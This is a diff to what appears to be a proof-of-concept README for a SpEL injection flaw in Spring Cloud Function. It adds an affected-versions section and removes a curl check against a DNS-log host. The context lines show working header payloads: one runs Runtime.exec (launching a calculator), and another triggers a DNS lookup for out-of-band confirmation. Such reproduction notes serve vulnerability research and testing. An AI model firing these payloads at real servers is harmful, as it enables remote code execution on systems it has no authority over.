@@ -7,6 +7,10 @@ header
 ```
 spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("open -a calculator.app")
 ```
+
+## 受影响吧版本
+SpringCloudFunction 3 <= 漏洞版本 <= 3.2.2
+
 # build
 ```bash
 wget https://github.com/spring-cloud/spring-cloud-function/archive/refs/tags/v3.1.6.zip
@@ -59,12 +63,6 @@ spring.cloud.function.routing-expression:T(java.net.InetAddress).getByName("rand
 Content-Length: 5
 
 helloexp
-```
-
-## check
-
-```bash
-curl -v 'https://helloexp.com/dnslog?q=random87535.rce.helloexp.com'
 ```
 
 ## official GitHub info
